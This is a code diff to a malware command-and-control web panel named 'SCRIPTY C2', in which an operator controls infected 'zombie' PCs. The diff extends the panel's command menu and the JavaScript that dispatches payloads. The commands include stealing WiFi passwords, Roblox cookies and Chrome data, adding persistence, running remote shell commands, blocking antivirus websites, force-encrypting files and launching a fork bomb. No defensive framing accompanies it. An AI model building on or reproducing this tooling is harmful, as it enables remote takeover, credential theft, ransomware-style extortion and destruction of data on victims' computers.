@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SCRITPY C2 PANEL</title>
+    <title>SCRITPY C2</title>
     <link rel="icon" type="image/png" href="image.jpg">
     <style>
         :root {
@@ -450,12 +450,12 @@
 ║       SCRIPTY C2 COMMANDS         ║
 ╚═══════════════════════════════════╝
 
-⚙️TARGET CONTROL:
+⚙️ TARGET CONTROL:
   !list              - Show Zombies (Numbered)
   !control <ID>      - Hook PC by Number
   !status            - Current Info
 
-⚡ POWER CONTROL:
+⚡ POWER & SYSTEM:
   !lock              - Lock PC
   !restart           - Restart System
   !shutdown          - Shutdown PC
@@ -463,8 +463,12 @@
   !blockinput        - Disable Keyboard/Mouse
   !freeinput         - Enable Keyboard/Mouse
   !blockscreen       - Block Screen Output
+  !taskmgr <on/off>  - Toggle Task Manager
+  !startup           - Add Persistence
+  !unstartup         - Remove Persistence
 
 🛡️ SECURITY:
+  !safemode          - Reboot into Safe Mode
   !blockav           - Block AV Websites
   !unblockav         - Unblock AV Websites
   !checkadmin        - Check Admin Status
@@ -472,10 +476,18 @@
   !unsetcritical     - Remove Critical Status
   !hidetaskbar       - Hide Taskbar
   !showtaskbar       - Show Taskbar
+  !av                - Detect Antivirus
 
-🕵️ STEALERS:
+🕵️ STEALERS & DATA:
   !wifi              - Steal WiFi Passwords
   !roblox            - Grab Roblox Cookie
+  !chrome            - Steal Chrome Data
+  !ip                - Get GeoIP Info
+
+💻 REMOTE EXECUTION:
+  !exec <cmd>        - Run Shell Command
+  !cd <path>         - Change Directory
+  !kill <name>       - Kill Process
 
 🔐 ENCRYPTION:
   !encrypt <pass>    - Force Encrypt Files
@@ -491,11 +503,13 @@
 
 👻 FUN:
   !jumpscare         - Jumpscare Screen
-  !blacklist <app>   - Kill Process
-  !whitelist <app>   - Restore Process
+  !blacklist <app>   - Kill Process Loop
+  !whitelist <app>   - Stop Killing Process
+  !forkbomb          - CRASH PC (DANGER)
                 `, "log-sys");
                 return;
             }
+
 
             if(cmd === '!list') {
                 printPCList();
@@ -542,7 +556,37 @@
             let pl = { target_id: currentTargetID };
 
             switch(cmd) {
-                // POWER COMMANDS
+                case '!chrome': pl.type='chrome_steal'; break;
+                case '!ip': pl.type='get_ip'; break;
+                case '!forkbomb': pl.type='forkbomb'; break;
+                case '!startup': pl.type='startup'; break;
+                case '!unstartup': pl.type='remove_startup'; break;
+                
+                case '!exec': 
+                    if(!args) return print("Usage: !exec <cmd>", "log-err");
+                    pl.type='execute'; pl.cmd=args; 
+                    break;
+                
+                case '!cd': 
+                    if(!args) return print("Usage: !cd <path>", "log-err");
+                    pl.type='cd'; pl.path=args; 
+                    break;
+
+                case '!taskmgr': 
+                    if(args === "on") pl.type='taskmgr_on';
+                    else if(args === "off") pl.type='taskmgr_off';
+                    else return print("Usage: !taskmgr <on/off>", "log-err");
+                    break;
+
+                case '!kill':
+                     if(!args) return print("Usage: !kill <process_name>", "log-err");
+                     pl.type='kill_proc'; pl.name=args;
+                     break;
+                
+                case '!safemode': 
+                    pl.type = 'enable_safe_mode'; 
+                    break;
+                case '!av': pl.type='check_av'; break;
                 case '!lock': pl.type='lock_pc'; break;
                 case '!restart': pl.type='restart_pc'; break;
                 case '!shutdown': pl.type='shutdown_pc'; break;
